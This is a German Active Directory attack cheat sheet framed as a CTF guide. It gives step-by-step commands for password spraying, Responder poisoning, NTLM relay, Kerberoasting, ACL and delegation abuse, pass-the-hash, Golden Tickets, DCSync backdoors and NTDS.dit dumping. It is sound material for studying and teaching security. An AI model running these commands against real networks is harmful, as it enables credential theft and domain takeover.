# 🏢 Methodik für Angriffe auf Active Directory

<!-- language-home-navigation -->
[🏠 Deutsche Startseite](../../README.de.md) • [🌐 Languages](../../README.md#-available-languages)

[🇮🇹 Versione Italiana](README.it.md) • [🇹🇷 Türkçe Sürüm](README.tr.md)

```
    █████╗ ██████╗     █████╗ ████████╗████████╗ █████╗  ██████╗██╗  ██╗
   ██╔══██╗██╔══██╗   ██╔══██╗╚══██╔══╝╚══██╔══╝██╔══██╗██╔════╝██║ ██╔╝
   ███████║██║  ██║   ███████║   ██║      ██║   ███████║██║     █████╔╝ 
   ██╔══██║██║  ██║   ██╔══██║   ██║      ██║   ██╔══██║██║     ██╔═██╗ 
   ██║  ██║██████╔╝   ██║  ██║   ██║      ██║   ██║  ██║╚██████╗██║  ██╗
   ╚═╝  ╚═╝╚═════╝    ╚═╝  ╚═╝   ╚═╝      ╚═╝   ╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝
         Schritt für Schritt vom Benutzer zum Domänenadministrator
```

<p align="center">
  <img src="https://img.shields.io/badge/AD-Methodology-red?style=for-the-badge" alt="AD">
  <img src="https://img.shields.io/badge/CTF-Guide-blue?style=for-the-badge" alt="CTF">
  <img src="https://img.shields.io/badge/Domain_Admin-green?style=for-the-badge" alt="DA">
</p>

---

## 🗺️ Überblick über die Angriffspfade

```
┌─────────────────────────────────────────────────────────────────────────┐
│                           AD-ANGRIFFSMETHODIK                           │
├─────────────────────────────────────────────────────────────────────────┤
│                                                                         │
│   PHASE 1: Erfassung      PHASE 2: Erster Zugriff  PHASE 3: Rechte      │
│   ├── Netzwerksuche       ├── Password Spray       ├── Kerberoast       │
│   ├── LDAP-Erfassung      ├── LLMNR-Poisoning      ├── AS-REP           │
│   ├── Benutzer            └── NTLM Relay           └── ACL-Missbrauch   │
│   └── BloodHound                                                        │
│                                                                         │
│   PHASE 4: Weiterbewegen  PHASE 5: Dauerzugriff    PHASE 6: Domäne      │
│   ├── Pass-the-Hash       ├── Golden Ticket        ├── DCSync           │
│   ├── WinRM/PSExec        ├── Silver Ticket        ├── NTDS.dit         │
│   └── WMI-Ausführung      └── Skeleton Key         └── Volle Kontrolle! │
│                                                                         │
└─────────────────────────────────────────────────────────────────────────┘
```

---

## 📋 Inhaltsverzeichnis

1. [Phase 1: Bestandsaufnahme](#-phase-1-bestandsaufnahme)
2. [Phase 2: Erster Zugriff](#-phase-2-erster-zugriff)
3. [Phase 3: Rechteausweitung](#-phase-3-rechteausweitung)
4. [Phase 4: Bewegung im Netzwerk](#-phase-4-bewegung-im-netzwerk)
5. [Phase 5: Dauerhaften Zugriff sichern](#-phase-5-dauerhaften-zugriff-sichern)
6. [Phase 6: Kontrolle über die Domäne](#-phase-6-kontrolle-über-die-domäne)
7. [Befehlsübersicht](#-befehlsübersicht)

---

## 🔍 Phase 1: Bestandsaufnahme

### 1.1 Netzwerkerkennung

```bash
# Domänencontroller finden
nmap -p 53,88,389,636,445 10.10.10.0/24

# AD-Dienste erkennen
nmap -p 88,135,139,389,445,464,636,3268,3269 -sV 10.10.10.10
```

**Wichtige Ports:**
| Port | Dienst | Zweck |
|------|---------|---------|
| 53 | DNS | Namensauflösung der Domäne |
| 88 | Kerberos | Authentifizierung |
| 389 | LDAP | Verzeichnisdienst |
| 445 | SMB | Dateifreigaben |
| 636 | LDAPS | Abgesichertes LDAP |
| 5985 | WinRM | Fernverwaltung |

### 1.2 Anonyme Bestandsaufnahme (ohne Zugangsdaten)

```bash
# RPC-Nullsitzung
rpcclient -U "" -N 10.10.10.10
rpcclient $> enumdomusers
rpcclient $> enumdomgroups

# Anonyme LDAP-Bindung
ldapsearch -x -H ldap://10.10.10.10 -b "DC=domain,DC=local"

# Enum4linux
enum4linux -a 10.10.10.10

# Benutzer mit Kerbrute ermitteln (ohne Zugangsdaten!)
kerbrute userenum -d domain.local --dc 10.10.10.10 users.txt
```

### 1.3 Mit gültigen Zugangsdaten

```bash
# Domäneninformationen abrufen
crackmapexec smb 10.10.10.10 -u user -p password --users
crackmapexec smb 10.10.10.10 -u user -p password --groups
crackmapexec smb 10.10.10.10 -u user -p password --shares

# LDAP-Bestandsaufnahme
ldapdomaindump -u 'DOMAIN\user' -p 'password' 10.10.10.10
```

### 1.4 Bestandsaufnahme mit PowerView

```powershell
# PowerView importieren
Import-Module .\PowerView.ps1

# Domäneninformationen
Get-Domain
Get-DomainController

# Interessante Ziele finden
Get-DomainUser -SPN                    # Für Kerberoasting geeignet
Get-DomainUser -PreauthNotRequired      # Für AS-REP Roasting geeignet
Get-DomainComputer -Unconstrained       # Delegierung

# Sitzungen von Domänenadministratoren finden
Find-DomainUserLocation -UserGroupIdentity "Domain Admins"
```

### 1.5 Daten für BloodHound sammeln

```bash
# Unter Linux (bloodhound-python)
bloodhound-python -u user -p password -d domain.local -ns 10.10.10.10 -c All

# Unter Windows (SharpHound)
.\SharpHound.exe -c All
```

**BloodHound-Abfragen:**
```cypher
# Kürzester Pfad zu Domänenadministratoren
MATCH p=shortestPath((u:User {name:"USER@DOMAIN.LOCAL"})-[*1..]->(g:Group {name:"DOMAIN ADMINS@DOMAIN.LOCAL"})) RETURN p

# Für Kerberoasting geeignete Benutzer
MATCH (u:User {hasspn:true}) RETURN u.name

# Benutzer mit DCSync-Rechten
MATCH (u:User)-[:DCSync|:GetChanges|:GetChangesAll]->(d:Domain) RETURN u.name
```

---

## 🔑 Phase 2: Erster Zugriff

### 2.1 Password Spraying (wenige Passwörter gegen viele Konten prüfen)

```bash
# Password Spraying mit CrackMapExec
crackmapexec smb 10.10.10.10 -u users.txt -p 'Summer2024!' --continue-on-success

# Password Spraying mit Kerbrute
kerbrute passwordspray -d domain.local --dc 10.10.10.10 users.txt 'Password123!'
```

**Häufige Passwörter:**
```
Jahreszeit+Jahr: Summer2024!, Winter2024
Firmenname+123: Company123!
Welcome1, Password1
```

### 2.2 LLMNR-/NBT-NS-Poisoning (Namensauflösung manipulieren)

```bash
# Terminal 1: Responder starten
sudo responder -I eth0 -wPv

# Auf Hashmaterial warten …
# NTLMv2 captured!

# Terminal 2: Hash knacken
hashcat -m 5600 hash.txt rockyou.txt
```

### 2.3 NTLM Relay

```bash
# Ziele ohne erforderliche SMB-Signierung finden
crackmapexec smb 10.10.10.0/24 --gen-relay-list relay.txt

# Responder (SMB deaktiviert)
sudo responder -I eth0

# Relay-Angriff
impacket-ntlmrelayx -tf relay.txt -smb2support
```

### 2.4 AS-REP Roasting (kein Passwort erforderlich!)

```bash
# Anfällige Benutzer finden
GetNPUsers.py domain.local/ -usersfile users.txt -dc-ip 10.10.10.10 -format hashcat

# Alternativ mit Zugangsdaten
GetNPUsers.py domain.local/user:password -dc-ip 10.10.10.10 -request

# Knacken
hashcat -m 18200 asrep.txt rockyou.txt
```

---

<a name="-phase-3-rechteausweitung"></a>

## ⬆️ Phase 3: Rechteausweitung

### 3.1 Kerberoasting

```bash
# Unter Linux
GetUserSPNs.py domain.local/user:password -dc-ip 10.10.10.10 -request

# Unter Windows
.\Rubeus.exe kerberoast /outfile:hashes.txt

# Knacken
hashcat -m 13100 kerberoast.txt rockyou.txt
```

### 3.2 Zugriffsrechte (ACLs) ausnutzen

**GenericAll auf einem Benutzerobjekt:**
```powershell
# Passwort ändern
Set-DomainUserPassword -Identity targetuser -AccountPassword (ConvertTo-SecureString 'P@ssw0rd!' -AsPlainText -Force)
```

**GenericAll auf einem Gruppenobjekt:**
```powershell
# Eigenes Konto zur Gruppe hinzufügen
Add-DomainGroupMember -Identity "Domain Admins" -Members attacker
```

**GenericWrite:**
```powershell
# SPN für Kerberoasting setzen
Set-DomainObject -Identity targetuser -Set @{serviceprincipalname='any/thing'}
```

**WriteDACL:**
```powershell
# Eigenem Konto DCSync-Rechte erteilen
Add-DomainObjectAcl -TargetIdentity "DC=domain,DC=local" -PrincipalIdentity attacker -Rights DCSync
```

### 3.3 Delegierung ausnutzen

**Unconstrained Delegation (uneingeschränkte Delegierung):**
```powershell
# Ziele finden
Get-DomainComputer -Unconstrained

# TGTs beobachten
.\Rubeus.exe monitor /interval:5 /targetuser:DC$

# Auslösen (PrinterBug)
SpoolSample.exe DC01 YOURHOST
```

**Constrained Delegation (eingeschränkte Delegierung):**
```bash
# Ticket anfordern
getST.py -spn cifs/target.domain.local -impersonate administrator domain.local/serviceaccount:password -dc-ip 10.10.10.10

# Ticket verwenden
export KRB5CCNAME=administrator.ccache
psexec.py -k -no-pass domain.local/administrator@target.domain.local
```

**Resource-Based Constrained Delegation (RBCD, ressourcenbasierte eingeschränkte Delegierung):**
```bash
# Computerkonto erstellen
addcomputer.py -computer-name FAKE01 -computer-pass 'Password123!' domain.local/user:password

# RBCD konfigurieren
rbcd.py -delegate-from FAKE01 -delegate-to TARGET -action write domain.local/user:password

# Ticket abrufen
getST.py -spn cifs/target.domain.local -impersonate administrator domain.local/FAKE01:'Password123!'
```

---

<a name="-phase-4-bewegung-im-netzwerk"></a>

## ➡️ Phase 4: Bewegung im Netzwerk

### 4.1 Pass-the-Hash

```bash
# PSExec mit Hash
impacket-psexec -hashes :NTLMHASH domain.local/admin@10.10.10.10

# WMIExec
impacket-wmiexec -hashes :NTLMHASH domain.local/admin@10.10.10.10

# SMBExec
impacket-smbexec -hashes :NTLMHASH domain.local/admin@10.10.10.10

# CrackMapExec
crackmapexec smb 10.10.10.10 -u admin -H NTLMHASH -x "whoami"
```

### 4.2 Pass-the-Ticket

```bash
# Ticket exportieren
.\Rubeus.exe dump

# Ticket verwenden (Linux)
export KRB5CCNAME=ticket.ccache
psexec.py -k -no-pass domain.local/admin@target

# Ticket verwenden (Windows)
.\Rubeus.exe ptt /ticket:base64ticket
```

### 4.3 WinRM

```bash
# Evil-WinRM mit Passwort
evil-winrm -i 10.10.10.10 -u admin -p password

# Mit Hash
evil-winrm -i 10.10.10.10 -u admin -H NTLMHASH
```

### 4.4 Overpass-the-Hash

```bash
# TGT mit Hash anfordern
.\Rubeus.exe asktgt /user:admin /rc4:NTLMHASH /ptt

# Anschließend Kerberos verwenden
dir \\server\share
```

---

## 🔒 Phase 5: Dauerhaften Zugriff sichern

### 5.1 Golden Ticket

```bash
# Benötigt: krbtgt-NTLM-Hash und Domänen-SID

# Ticket erstellen
ticketer.py -nthash KRBTGT_HASH -domain-sid S-1-5-21-... -domain domain.local administrator

# Verwenden
export KRB5CCNAME=administrator.ccache
psexec.py -k -no-pass domain.local/administrator@dc01.domain.local
```

```powershell
# Mimikatz
kerberos::golden /user:administrator /domain:domain.local /sid:S-1-5-21-... /krbtgt:HASH /ptt
```

### 5.2 Silver Ticket

```bash
# Dienstticket erstellen
ticketer.py -nthash SERVICE_HASH -domain-sid S-1-5-21-... -domain domain.local -spn cifs/target.domain.local administrator
```

### 5.3 DCSync-Rechte als Hintertür

```powershell
# Einem Benutzer DCSync-Rechte erteilen
Add-DomainObjectAcl -TargetIdentity "DC=domain,DC=local" -PrincipalIdentity backdooruser -Rights DCSync
```

---

## 👑 Phase 6: Kontrolle über die Domäne

### 6.1 DCSync

```bash
# Alle Hashes auslesen
impacket-secretsdump domain.local/admin:password@10.10.10.10

# Mit Hash
impacket-secretsdump -hashes :NTLMHASH domain.local/admin@10.10.10.10

# Bestimmter Benutzer
impacket-secretsdump domain.local/admin:password@10.10.10.10 -just-dc-user administrator
```

### 6.2 NTDS.dit extrahieren

```bash
# Schattenkopie erstellen
vssadmin create shadow /for=C:

# NTDS.dit kopieren
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\ntds.dit C:\ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\system

# Offline auslesen
impacket-secretsdump -ntds ntds.dit -system system LOCAL
```

### 6.3 Daten mit CrackMapExec auslesen

```bash
# NTDS über DCSync auslesen
crackmapexec smb DC01 -u admin -p password --ntds
```

---

## 📊 Befehlsübersicht

### Einzeiler für die Bestandsaufnahme

```bash
# Domänencontroller finden
nmap -p 88,389 --open 10.10.10.0/24

# Benutzer ermitteln (ohne Zugangsdaten)
kerbrute userenum -d domain.local --dc 10.10.10.10 /usr/share/wordlists/names.txt

# Für AS-REP Roasting geeignete Konten finden
GetNPUsers.py domain.local/ -usersfile users.txt -dc-ip 10.10.10.10 -no-pass

# Kerberoast
GetUserSPNs.py domain.local/user:pass -dc-ip 10.10.10.10 -request
```

### Angriffsübersicht

| Angriff | Befehl |
|--------|---------|
| Password Spray | `crackmapexec smb DC -u users.txt -p 'Pass123!'` |
| AS-REP Roast | `GetNPUsers.py domain.local/ -usersfile u.txt -dc-ip DC` |
| Kerberoast | `GetUserSPNs.py domain.local/u:p -dc-ip DC -request` |
| DCSync | `secretsdump.py domain.local/admin:pass@DC` |
| Pass-the-Hash | `psexec.py -hashes :HASH domain.local/admin@target` |
| Golden Ticket | `ticketer.py -nthash KRBTGT -domain-sid SID -domain domain.local admin` |

### Hashes knacken

| Hash-Typ | Hashcat-Modus |
|-----------|--------------|
| NTLM | `-m 1000` |
| NTLMv2 | `-m 5600` |
| Kerberoast | `-m 13100` |
| AS-REP | `-m 18200` |

---

## 🎯 CTF-Tipps

1. **Immer zuerst die Umgebung erfassen** – Nicht ohne vorherige Bestandsaufnahme angreifen
2. **AS-REP prüfen** – Hashmaterial ohne Zugangsdaten erhalten!
3. **BloodHound einsetzen** – Angriffspfade finden
4. **ACLs prüfen** – Häufig falsch konfigurierte Berechtigungen
5. **Nach Delegierung suchen** – Mögliche schnelle Ansatzpunkte
6. **Password Spraying vorsichtig einsetzen** – Kontosperren beachten!
7. **Alle Zugangsdaten festhalten** – Sie werden später noch benötigt

---

## 📚 Verwandte Cheatsheets

- [BloodHound](../../BloodHound/translations/README.de.md)
- [Impacket](../../Impacket/translations/README.de.md)
- [CrackMapExec (Englisch)](../../CrackMapExec/README.md)
- [Rubeus (Englisch)](../../Rubeus/README.md)
- [PowerView (Englisch)](../../PowerView/README.md)
- [Responder (Englisch)](../../Responder/README.md)
- [Evil-WinRM (Englisch)](../../Evil-WinRM/README.md)
- [Mimikatz](../../Mimikatz/translations/README.de.md)

---

## 📝 Ergänzende Hinweise zu den Originalbeispielen

- **Voraussetzungen und Versionen:** Die Phasen sind eine Orientierung, kein garantierter Weg vom Benutzer zum Domänenadministrator. Active Directory (AD) ist der Verzeichnisdienst; ACLs sind Zugriffslisten, SPNs Dienstprinzipalnamen und TGTs Kerberos-Tickets zur Anforderung weiterer Tickets. Anonyme Abfragen, entfernte Ausführung, ACL-Änderungen, Delegierung und Replikation benötigen jeweils passende Konfiguration und Rechte. Die Beispiele mischen Shell-, Windows- und PowerShell-Kontexte. BloodHound-Collector und Datenmodell müssen zusammenpassen: bloodhound-python bezeichnet im ursprünglichen Projekt die Legacy-Fassung, CE hat eine eigene Variante. Die ursprünglichen Aufrufe bleiben erhalten. [BloodHound.py: Versionskompatibilität](https://github.com/dirkjanm/BloodHound.py), [Impacket: Beispiele](https://github.com/fortra/impacket/tree/master/examples).
- **BloodHound und DCSync:** Die DCSync-Abfrage liefert bereits einen Treffer für eine der alternativ genannten Kanten. Für Replikation von Passwortdaten sind aber GetChanges und GetChangesAll gemeinsam erforderlich; eine dieser beiden Rohkanten allein genügt nicht. Die abgeleitete DCSync-Kante steht bereits für diese Kombination. Auch ein Graphpfad ist kein Beweis, dass alle praktischen Voraussetzungen erfüllt sind. Die mit # markierten Zeilen im Cypher-Block sind Erläuterungen, keine gültigen Cypher-Kommentare. [BloodHound: DCSync](https://bloodhound.specterops.io/resources/edges/dc-sync), [Neo4j: Cypher-Kommentare](https://neo4j.com/docs/cypher-manual/5/syntax/comments/).
- **Roasting, Dateien und Hashformate:** AS-REP Roasting ohne Passwort setzt ein Konto ohne erforderliche Kerberos-Vorauthentifizierung voraus. Die dargestellten Aufrufe erzeugen nicht automatisch die später genannten Dateien asrep.txt und kerberoast.txt; deren Speicherung fehlt im Ablauf. Die Hashcat-Modi für Kerberoast und AS-REP in der Tabelle beziehen sich auf etype 23, nicht auf jeden möglichen Kerberos-Verschlüsselungstyp. Die Originalwerte bleiben unverändert. [Impacket: GetNPUsers](https://github.com/fortra/impacket/blob/master/examples/GetNPUsers.py), [GetUserSPNs](https://github.com/fortra/impacket/blob/master/examples/GetUserSPNs.py), [Hashcat: Formate](https://hashcat.net/wiki/doku.php?id=example_hashes).
- **Relay und aufgezeichnetes Material:** Die Bemerkung „SMB deaktiviert“ ändert Responder nicht selbst; dessen Konfiguration und parallel belegte Dienste müssen zum gezeigten Relay-Aufbau passen. Fehlende verpflichtende SMB-Signierung ist eine relevante Bedingung, aber keine allgemeine Erfolgsgarantie. Aufgezeichnete NTLMv2-Challenge-Response-Daten sind außerdem nicht einfach der NT-Hash für die Pass-the-Hash-Beispiele. [Responder: Konfiguration](https://github.com/lgandx/Responder), [Microsoft: SMB-Signierung](https://learn.microsoft.com/en-us/windows-server/storage/file-server/smb-signing-overview).
- **Delegierung und Tickets:** Die Delegierungsabschnitte setzen passende Konten, Attribute und Rechte voraus. Die RBCD-Kurzfassung lässt insbesondere Computerkontonamen mit ihrem üblichen Dollar-Suffix und Umgebungsbedingungen offen. Ein Ticket muss zum benötigten Dienst und Ziel passen; gespeicherte Cache-Dateinamen unterscheiden sich je nach Werkzeugversion. Der fest angenommene Name administrator.ccache ist deshalb keine allgemeine Zusage. RC4-/NT-Hash-Beispiele funktionieren zudem nicht unabhängig von den erlaubten Verschlüsselungstypen. [BloodHound: AllowedToAct](https://bloodhound.specterops.io/resources/edges/allowed-to-act), [Impacket: getST](https://github.com/fortra/impacket/blob/master/examples/getST.py), [RBCD-Kontonamen](https://github.com/fortra/impacket/blob/master/examples/rbcd.py).

---

<p align="center">
  <b>🏢 Vom Benutzer zum Domänenadministrator!</b><br>
  <i>Die Methodik Schritt für Schritt anwenden und Domänenkontrolle verstehen</i>
</p>
